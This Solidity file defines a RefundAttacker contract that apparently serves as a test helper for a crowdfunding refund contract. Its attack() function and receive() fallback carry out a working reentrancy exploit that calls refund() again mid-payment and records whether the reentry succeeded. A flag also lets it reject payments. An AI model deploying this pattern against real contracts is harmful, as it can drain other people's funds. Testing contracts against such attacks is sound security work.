pragma solidity ^0.8.28;

import {IRefundTarget} from "../interfaces/IRefundTarget.sol";

contract RefundAttacker {
    IRefundTarget public immutable target;
    uint256 public campaignId;
    bool public rejectPayments;
    bool public attemptReentry;
    bool public reentrySucceeded;

    constructor(address targetAddress) {
        target = IRefundTarget(targetAddress);
    }

    function deposit(uint256 id, bool vulnerable) external payable {
        campaignId = id;
        bytes memory data = vulnerable ? abi.encodeWithSignature("deposit()") : abi.encodeWithSignature("contribute(uint256)", id);
        (bool sent,) = address(target).call{value: msg.value}(data);
        require(sent);
    }

    function create(string calldata title, uint256 goal, uint64 deadline) external {
        (bool ok,) = address(target).call(abi.encodeWithSignature("createCampaign(string,uint256,uint64)", title, goal, deadline));
        require(ok);
    }

    function withdraw(uint256 id) external {
        (bool ok, bytes memory reason) = address(target).call(abi.encodeWithSignature("withdrawFunds(uint256)", id));
        if (!ok) assembly { revert(add(reason, 32), mload(reason)) }
    }

    function setRejectPayments(bool value) external { rejectPayments = value; }

    function attack() external {
        attemptReentry = true;
        target.refund(campaignId);
        attemptReentry = false;
    }

    receive() external payable {
        require(!rejectPayments);
        if (attemptReentry && address(target).balance >= msg.value) {
            (bool ok,) = address(target).call(abi.encodeCall(IRefundTarget.refund, (campaignId)));
            reentrySucceeded = ok;
        }
    }
}
